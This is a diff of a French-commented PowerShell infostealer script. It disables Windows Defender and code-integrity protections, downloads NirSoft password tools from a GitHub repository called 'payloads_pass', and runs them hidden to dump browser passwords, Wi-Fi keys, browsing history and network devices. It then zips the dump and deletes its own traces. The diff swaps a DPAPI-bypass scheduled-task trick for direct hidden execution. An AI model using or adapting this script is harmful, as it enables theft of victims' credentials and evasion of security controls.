@@ -16,39 +16,37 @@ Add-MpPreference -ExclusionPath $basePath -Force
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Type DWord -Value 0
 CiTool --refresh --json
 
-# Téléchargement des exécutables depuis TON propre GitHub
+# Téléchargement des exécutables depuis ton GitHub
 Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile WirelessKeyView.exe
 Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WebBrowserPassView.exe" -OutFile WebBrowserPassView.exe
 Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile BrowsingHistoryView.exe
 Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile WNetWatcher.exe
 
-# --- CONTOURNEMENT DPAPI : Exécution de WebBrowserPassView dans la session utilisateur active ---
-$sessionId = (Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1).SessionId
+# --- EXTRACTION PROPRE DES MOTS DE PASSE & OUTILS ---
+# On tente l'exécution directe de WebBrowserPassView
+Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
 
-if ($null -ne $sessionId) {
-    SchTasks /Create /TN "TempPassEx" /TR "$basePath\WebBrowserPassView.exe /stext $basePath\passwords.txt" /SC ONCE /ST 00:00 /RU "Interactive" /F | Out-Null
-    SchTasks /Run /TN "TempPassEx" | Out-Null
-    Start-Sleep -Seconds 3
-    SchTasks /Delete /TN "TempPassEx" /F | Out-Null
-} else {
-    .\WebBrowserPassView.exe /stext passwords.txt
+# Exécution des autres outils
+Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
+Start-Process -FilePath "$basePath\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext $basePath\history.txt" -Wait -WindowStyle Hidden
+Start-Process -FilePath "$basePath\WNetWatcher.exe" -ArgumentList "/stext $basePath\connected_devices.txt" -Wait -WindowStyle Hidden
+
+# Attente que les fichiers soient générés
+$maxTries = 15
+$tries = 0
+while (!(Test-Path "passwords.txt") -and ($tries -lt $maxTries)) {
+    Start-Sleep -Seconds 1
+    $tries++
 }
 
-# Exécution des autres outils (en mode système/admin global)
-.\WirelessKeyView.exe /stext wifi.txt
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WNetWatcher.exe /stext connected_devices.txt
+# S'assure que les fichiers existent même si vides pour éviter un blocage
+if (!(Test-Path "passwords.txt")) { Set-Content -Path "passwords.txt" -Value "No passwords extracted" }
+if (!(Test-Path "wifi.txt")) { Set-Content -Path "wifi.txt" -Value "No wifi keys extracted" }
+if (!(Test-Path "history.txt")) { Set-Content -Path "history.txt" -Value "No history extracted" }
+if (!(Test-Path "connected_devices.txt")) { Set-Content -Path "connected_devices.txt" -Value "No devices found" }
 
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt")) { 
-    Start-Sleep -Seconds 1 
-}
-
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
+Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder" -Force
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
-
-while (!(Test-Path "$dumpFile")) { 
-    Start-Sleep -Seconds 1 
-}
 
 if (!(Test-Path $dumpFile)) { exit 1 }
 
@@ -73,7 +71,7 @@ try {
 $fileStream.Close()
 $fileStream.Dispose()
 
-# Nettoyage des traces et rétablissement des sécurités Windows
+# Nettoyage
 Set-Location C:\Users\Public\Documents
 Remove-Item -Recurse -Force scripts
 Remove-Item "C:\Users\Public\Documents\ps.ps1"
